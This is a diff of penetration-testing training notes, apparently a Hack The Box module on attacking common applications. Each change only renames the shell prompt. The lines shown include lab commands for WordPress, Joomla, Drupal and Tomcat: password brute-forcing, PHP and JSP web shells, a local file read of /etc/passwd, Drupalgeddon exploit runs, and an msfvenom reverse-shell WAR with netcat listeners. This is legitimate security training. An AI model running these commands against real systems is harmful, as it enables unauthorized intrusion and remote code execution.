@@ -96,8 +96,8 @@ To do this quickly, we could run the following:
 &#x20; Introduction to Attacking Common Applications
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ IP=10.129.42.195
-AbdulrahmanTamim@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
+root@htb[/htb]$ IP=10.129.42.195
+root@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
 ```
 
 After this command, our `/etc/hosts` file would look like the following (on a newly spawned Pwnbox):
@@ -105,7 +105,7 @@ After this command, our `/etc/hosts` file would look like the following (on a ne
 &#x20; Introduction to Attacking Common Applications
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat /etc/hosts
+root@htb[/htb]$ cat /etc/hosts
 
 # Your system has configured 'manage_etc_hosts' as True.
 # As a result, if you wish for changes to this file to persist
@@ -151,7 +151,7 @@ As penetration testers, we need to have strong enumeration skills and be able to
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
+root@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,1000 --open -oA web_discovery -iL scope_list
 ```
 
 We may find an enormous amount of hosts with services running on ports 80 and 443 alone. What do we do with this data? Sifting through the enumeration data by hand in a large environment would be far too time-consuming, especially since most assessments are under strict time constraints. Browsing to each IP/hostname + port would also be highly inefficient.
@@ -199,7 +199,7 @@ Let's assume our client provided us with the following scope:
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat scope_list 
+root@htb[/htb]$ cat scope_list 
 
 app.inlanefreight.local
 dev.inlanefreight.local
@@ -234,7 +234,7 @@ Note: Not all hosts in the scope list above will be accessible when spawning the
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
+root@htb[/htb]$ sudo  nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list 
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:49 EDT
 Stats: 0:00:07 elapsed; 1 hosts completed (4 up), 4 undergoing SYN Stealth Scan
@@ -293,7 +293,7 @@ Enumerating one of the hosts further using an Nmap service scan (`-sV`) against 
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap --open -sV 10.129.201.50
+root@htb[/htb]$ sudo nmap --open -sV 10.129.201.50
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-07 21:58 EDT
 Nmap scan report for 10.129.201.50
@@ -328,7 +328,7 @@ We can install EyeWitness via apt:
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo apt install eyewitness
+root@htb[/htb]$ sudo apt install eyewitness
 ```
 
 or clone the [repository](https://github.com/FortyNorthSecurity/EyeWitness), navigate to the `Python/setup` directory and run the `setup.sh` installer script. EyeWitness can also be run from a Docker container, and a Windows version is available, which can be compiled using Visual Studio.
@@ -338,7 +338,7 @@ Running `eyewitness -h` will show us the options available to us:
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ eyewitness -h
+root@htb[/htb]$ eyewitness -h
 
 usage: EyeWitness.py [--web] [-f Filename] [-x Filename.xml]
                      [--single Single URL] [--no-dns] [--timeout Timeout]
@@ -387,7 +387,7 @@ Let's run the default `--web` option to take screenshots using the Nmap XML outp
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
+root@htb[/htb]$ eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
 
 ################################################################################
 #                                  EyeWitness                                  #
@@ -439,13 +439,13 @@ Would you like to open the report now? [Y/n]
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
+root@htb[/htb]$ wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
 ```
 
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 
+root@htb[/htb]$ unzip aquatone_linux_amd64_1.7.0.zip 
 
 Archive:  aquatone_linux_amd64_1.7.0.zip
   inflating: aquatone                
@@ -456,7 +456,7 @@ Archive:  aquatone_linux_amd64_1.7.0.zip
 We can move it to a location in our `$PATH` such as `/usr/local/bin` to be able to call the tool from anywhere or just drop the binary in our working (say, scans) directory. It's personal preference but typically most efficient to build our attack VMs with most tools available to use without having to constantly change directories or call them from other directories.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo $PATH
+root@htb[/htb]$ echo $PATH
 
 /home/mrb3n/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 ```
@@ -466,7 +466,7 @@ In this example, we provide the tool the same `web_discovery.xml` Nmap output sp
 &#x20; Application Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap
+root@htb[/htb]$ cat web_discovery.xml | ./aquatone -nmap
 
 aquatone v1.7.0 started at 2021-09-07T22:31:03-04:00
 
@@ -622,7 +622,7 @@ Another quick way to identify a WordPress site is by looking at the page source.
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress
 
 <meta name="generator" content="WordPress 5.8" /
 ```
@@ -634,7 +634,7 @@ Looking at the page source, we can see that the [Business Gravity](https://wordp
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes
 
 <link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' />
 ```
@@ -644,7 +644,7 @@ Next, let's take a look at which plugins we can uncover.
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins
 
 <link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
 <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script>
@@ -663,7 +663,7 @@ Let's dig around a bit more. Checking the page source of another page, we can se
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
 
 <link rel='stylesheet' id='contact-form-7-css'  href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' />
 <link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
@@ -707,7 +707,7 @@ Let's take things a step further and validate/add to some of our data points wit
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo gem install wpscan
+root@htb[/htb]$ sudo gem install wpscan
 ```
 
 WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from [WPVulnDB](https://wpvulndb.com/), which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the `--api-token parameter`.
@@ -717,7 +717,7 @@ Typing `wpscan -h` will bring up the help menu.
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wpscan -h
+root@htb[/htb]$ wpscan -h
 
 _______________________________________________________________
          __          _______   _____
@@ -758,7 +758,7 @@ The `--enumerate` flag is used to enumerate various components of the WordPress 
 &#x20; WordPress - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+root@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
 
 <SNIP>
 
@@ -931,7 +931,7 @@ WPScan can be used to brute force usernames and passwords. The scan report in th
 &#x20; Attacking WordPress
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+root@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 
 [+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
 [+] Started: Wed Aug 25 11:56:23 2021
@@ -983,7 +983,7 @@ Click on `Update File` at the bottom to save. We know that WordPress themes are 
 &#x20; Attacking WordPress
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+root@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1116,7 +1116,7 @@ As we can see, the `pl` parameter allows us to include a file without any type o
 &#x20; Attacking WordPress
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -1164,7 +1164,7 @@ The exploit script takes two parameters: `-u` the URL and `-p` the path to a val
 &#x20; Attacking WordPress
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+root@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 
 ---------------------------------------------------------------
 [-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
@@ -1193,7 +1193,7 @@ The exploit as written may fail, but we can use `cURL` to execute commands using
 &#x20; Attacking WordPress
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
+root@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
 
 GIF689a;
 
@@ -1230,7 +1230,7 @@ Querying this API, we can see over 2.7 million Joomla installs!
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
+root@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
 
 {
     "data": {
@@ -1265,7 +1265,7 @@ We can often fingerprint Joomla by looking at the page source, which tells us th
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
+root@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla
 
 	<meta name="generator" content="Joomla! - Open Source Content Management" />
 
@@ -1313,7 +1313,7 @@ We can also often see the telltale Joomla favicon (but not always). We can finge
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+root@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
 
 1- What is this?
 	* This is a Joomla! installation/upgrade package to version 3.x
@@ -1327,7 +1327,7 @@ In certain Joomla installs, we may be able to fingerprint the version from JavaS
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+root@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
 
 <?xml version="1.0" encoding="UTF-8"?>
 <extension version="3.6" type="file" method="upgrade">
@@ -1356,7 +1356,7 @@ We can clone the Git repo and install it manually or install via `pip`.
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo pip3 install droopescan
+root@htb[/htb]$ sudo pip3 install droopescan
 
 Collecting droopescan
   Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
@@ -1370,7 +1370,7 @@ Once the installation is complete, we can confirm that the tool is working by ru
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ droopescan -h
+root@htb[/htb]$ droopescan -h
 
 usage: droopescan (sub-commands ...) [options ...] {arguments ...}
 
@@ -1411,7 +1411,7 @@ Let's run a scan and see what it turns up.
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/
+root@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/
 
 [+] Possible version(s):                                                        
     3.8.10
@@ -1441,9 +1441,9 @@ As we can see, it did not turn up much information aside from the possible versi
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 -m pip install urllib3
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 -m pip install certifi
-AbdulrahmanTamim@htb[/htb]$ sudo python2.7 -m pip install bs4
+root@htb[/htb]$ sudo python2.7 -m pip install urllib3
+root@htb[/htb]$ sudo python2.7 -m pip install certifi
+root@htb[/htb]$ sudo python2.7 -m pip install bs4
 ```
 
 While a bit out of date, it can be helpful in our enumeration. Let's run a scan.
@@ -1451,7 +1451,7 @@ While a bit out of date, it can be helpful in our enumeration. Let's run a scan.
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
+root@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local
 
 -------------------------------------------
       	     Joomla Scan                  
@@ -1500,7 +1500,7 @@ The default administrator account on Joomla installs is `admin`, but the passwor
 &#x20; Joomla - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+root@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
  
 admin:admin
 ```
@@ -1548,7 +1548,7 @@ Once this is in, click on `Save & Close` at the top and confirm code execution u
 &#x20; Attacking Joomla
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+root@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1570,7 +1570,7 @@ We can run the script by specifying the `--url`, `--username`, `--password`, and
 &#x20; Attacking Joomla
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+root@htb[/htb]$ python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
  
 # Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal && Authenticated Arbitrary File Deletion
 # Web Site: Haboob.sa
@@ -1647,7 +1647,7 @@ A Drupal website can be identified in several ways, including by the header or f
 &#x20; Drupal - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal
+root@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal
 
 <meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />
       <span>Powered by <a href="https://www.drupal.org">Drupal</a></span>
@@ -1676,7 +1676,7 @@ Once we have discovered a Drupal instance, we can do a combination of manual and
 &#x20; Drupal - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+root@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
 
 Drupal 7.57, 2018-02-21
 ```
@@ -1686,7 +1686,7 @@ Here we have identified an older version of Drupal in use. Trying this against t
 &#x20; Drupal - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
+root@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
 
 <!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.</p></body></html>
 ```
@@ -1698,7 +1698,7 @@ Let's run a scan against the `http://drupal.inlanefreight.local` host.
 &#x20; Drupal - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
+root@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
 
 [+] Plugins found:                                                              
     php http://drupal.inlanefreight.local/modules/php/
@@ -1757,7 +1757,7 @@ We also want to make sure to set `Text format` drop-down to `PHP code`. After cl
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+root@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1767,7 +1767,7 @@ From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/rele
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+root@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
 ```
 
 Once downloaded go to `Administration` > `Reports` > `Available updates`.
@@ -1793,8 +1793,8 @@ Download the archive and extract its contents.
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
-AbdulrahmanTamim@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
+root@htb[/htb]$ wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+root@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
 ```
 
 Create a PHP web shell with the contents:
@@ -1823,8 +1823,8 @@ The configuration above will apply rules for the / folder when we request a file
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mv shell.php .htaccess captcha
-AbdulrahmanTamim@htb[/htb]$ tar cvf captcha.tar.gz captcha/
+root@htb[/htb]$ mv shell.php .htaccess captcha
+root@htb[/htb]$ tar cvf captcha.tar.gz captcha/
 
 captcha/
 captcha/.travis.yml
@@ -1846,7 +1846,7 @@ Once the installation succeeds, browse to `/modules/captcha/shell.php` to execut
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+root@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -1874,7 +1874,7 @@ Running the script with the `-h` flag shows us the help menu.
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 drupalgeddon.py 
+root@htb[/htb]$ python2.7 drupalgeddon.py 
 
   ______                          __     _______  _______ _____    
  |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
@@ -1932,7 +1932,7 @@ Here we see that we need to supply the target URL and a username and password fo
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+root@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
 
 <SNIP>
 
@@ -1960,7 +1960,7 @@ We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 drupalgeddon2.py 
+root@htb[/htb]$ python3 drupalgeddon2.py 
 
 ################################################################
 # Proof-Of-Concept for CVE-2018-7600
@@ -1980,7 +1980,7 @@ We can check quickly with `cURL` and see that the `hello.txt` file was indeed up
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
+root@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt
 
 ;-)
 ```
@@ -1996,7 +1996,7 @@ Code: php
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+root@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
 
 PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
 ```
@@ -2014,7 +2014,7 @@ Next, run the modified exploit script to upload our malicious PHP file.
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 drupalgeddon2.py 
+root@htb[/htb]$ python3 drupalgeddon2.py 
 
 ################################################################
 # Proof-Of-Concept for CVE-2018-7600
@@ -2034,7 +2034,7 @@ Finally, we can confirm remote code execution using `cURL`.
 &#x20; Attacking Drupal
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+root@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
@@ -2149,7 +2149,7 @@ Custom error pages may be in use that do not leak this version information. In t
 &#x20; Tomcat - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
+root@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 
 
 <html lang="en"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><link href="./images/docs-stylesheet.css" rel="stylesheet" type="text/css"><title>Apache Tomcat 9 (9.0.30) - Documentation Index</title><meta name="author" 
 
@@ -2294,7 +2294,7 @@ After fingerprinting the Tomcat instance, unless it has a known vulnerability, w
 &#x20; Tomcat - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
+root@htb[/htb]$ gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
 
 ===============================================================
 Gobuster v3.0.1
@@ -2463,7 +2463,7 @@ A quick check of the value in the `Authorization` header for one request shows t
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d
+root@htb[/htb]$ echo YWRtaW46dmFncmFudA== |base64 -d
 
 admin:vagrant
 ```
@@ -2523,7 +2523,7 @@ This is a very straightforward script that takes a few arguments. We can run the
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 mgr_brute.py  -h
+root@htb[/htb]$ python3 mgr_brute.py  -h
 
 usage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS
 
@@ -2544,7 +2544,7 @@ We can try out the script with the default Tomcat users and passwords file that 
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+root@htb[/htb]$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 
 [+] Atacking.....
 
@@ -2608,8 +2608,8 @@ if (request.getParameter("cmd") != null) {
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
-AbdulrahmanTamim@htb[/htb]$ zip -r backup.war cmd.jsp 
+root@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+root@htb[/htb]$ zip -r backup.war cmd.jsp 
 
   adding: cmd.jsp (deflated 81%)
 ```
@@ -2627,7 +2627,7 @@ If we click on `backup`, we will get redirected to `http://web01.inlanefreight.l
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+root@htb[/htb]$ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
 
 <HTML><BODY>
 <FORM METHOD="GET" NAME="myform" ACTION="">
@@ -2649,7 +2649,7 @@ We could also use `msfvenom` to generate a malicious WAR file. The payload [java
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+root@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
 
 Payload size: 1098 bytes
 Final size of war file: 1098 bytes
@@ -2660,7 +2660,7 @@ Start a Netcat listener and click on `/backup` to execute the shell.
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 4443
+root@htb[/htb]$ nc -lnvp 4443
 
 listening on [any] 4443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224
@@ -2714,7 +2714,7 @@ The AJP service is usually running at port 8009 on a Tomcat server. This can be 
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
+root@htb[/htb]$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
 Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
@@ -2733,7 +2733,7 @@ The above scan confirms that ports 8080 and 8009 are open. The PoC code for the 
 &#x20; Attacking Tomcat
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
+root@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
 
 Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
 ----------------------------
@@ -2856,7 +2856,7 @@ Running the above commands results in a reverse shell connection.
 &#x20; Attacking Jenkins
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lvnp 8443
+root@htb[/htb]$ nc -lvnp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 57844
